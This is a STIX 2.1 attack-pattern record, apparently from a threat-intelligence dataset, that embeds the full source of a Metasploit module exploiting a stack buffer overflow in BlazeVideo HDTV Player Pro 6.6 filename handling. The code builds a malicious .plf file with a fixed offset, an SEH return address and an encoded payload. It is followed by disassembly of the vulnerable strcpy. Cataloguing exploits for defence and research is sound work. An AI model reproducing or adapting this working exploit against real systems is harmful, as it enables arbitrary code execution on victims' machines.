{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--007e09ec-3002-4644-bafd-cc931ae8b270",
    "created": "2024-08-14T16:37:44.131927Z",
    "modified": "2024-08-14T16:37:44.13193Z",
    "name": "\"BlazeVideo HDTV Player Pro v6.6 Filename Handling Vulnerability\"",
    "description": " This module exploits a vulnerability found in BlazeVideo HDTV Player's filename handling routine.  When supplying a string of input data embedded in a .plf file the MediaPlayerCtrl.dll component will try to extract a filename by using PathFindFileNameA(), and then copies whatever the return value is on the stack by using an inline strcpy.  As a result, if this input data is long enough, it can cause a stack-based buffer overflow, which may lead to arbitrary code execution under the context of the user.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/blazedvd_hdtv_bof.rb",
            "external_id": "blazedvd_hdtv_bof.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"BlazeVideo HDTV Player Pro v6.6 Filename Handling Vulnerability\",\n      'Description'    => %q{\n          This module exploits a vulnerability found in BlazeVideo HDTV Player's filename\n        handling routine.  When supplying a string of input data embedded in a .plf file,\n        the MediaPlayerCtrl.dll component will try to extract a filename by using\n        PathFindFileNameA(), and then copies whatever the return value is on the stack by\n        using an inline strcpy.  As a result, if this input data is long enough, it can cause\n        a stack-based buffer overflow, which may lead to arbitrary code execution under the\n        context of the user.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'b33f',   #Original\n          'sinn3r'  #Metasploit\n        ],\n      'References'     =>\n        [\n          ['OSVDB', '80896'],\n          ['EDB', '18693'],\n          ['EDB', '22931']\n        ],\n      'Payload'        =>\n        {\n          'BadChars'        => \"\\x00\\x0a\\x1a\\x2f\\x3a\\x5c\",\n          'StackAdjustment' => -3500\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => 'thread'\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # MediaPlayerCtrl.dll P/P/R\n          # Tested on: Windows 7 SP1/SP0, Windows XP SP3 / Windows Vista SP2/SP1/SP0\n          ['BlazeVideo HDTV Player Pro v6.6.0.3', {'Ret'=>0x64020327, 'Offset'=>868}]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-04-03',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ false, 'The file name.', 'msf.plf'])\n      ])\n  end\n\n  def exploit\n    buf = 'http://'\n    buf << rand_text_alpha_upper(target['Offset'])\n    buf << generate_seh_record(target.ret)\n    buf << payload.encoded\n    buf << rand_text_alpha(5000-buf.length)\n\n    print_status(\"Creating '#{datastore['FILENAME']}'...\")\n    file_create(buf)\n  end\nend\n\n=begin\nVersion: HDTV Player Professional v6.6\n\nIn MediaPlayerCtrl.dll (File version: 2.0.0.2; Product version: 2.0.0.2)\n.text:6400E574                 mov     eax, [esp+138h+Source]\n.text:6400E578                 mov     edx, [ebp+0ECh]\n.text:6400E57E                 push    eax\n.text:6400E57F                 push    eax             ; pszPath  <-- Our URL\n.text:6400E580                 mov     edi, [edx]\n.text:6400E582                 call    ebx ; PathFindFileNameA\n.text:6400E584                 mov     ecx, [ebp+0ECh]\n.text:6400E58A                 push    eax             ; File path to copy\n.text:6400E58B                 push    esi\n.text:6400E58C                 push    1\n.text:6400E58E                 call    dword ptr [edi] ; 0x6400f1f0\n\n0x6400F1F0 (no length check either) goes down to 0x6400F670:\n\nint __thiscall sub_6400F670(int this, int a2, int a3, const char *source, const char *a5)\n{\n  ...\n\n  v5 = this;\n  if ( a2 && source && a5 )\n  {\n    memset(&buffer, 0, '\\x02\\x10');\n    v16 = *(this + 4);\n    *(this + 4) = v16 + 1;\n    v18 = a3;\n    buffer = a2;\n    strcpy(&Dest2, source);  // <-- This is a rep movs\n=end\n",
    "x_mitre_disclosure_date": "2012-04-03",
    "x_mitre_platforms": [
        "win'"
    ]
}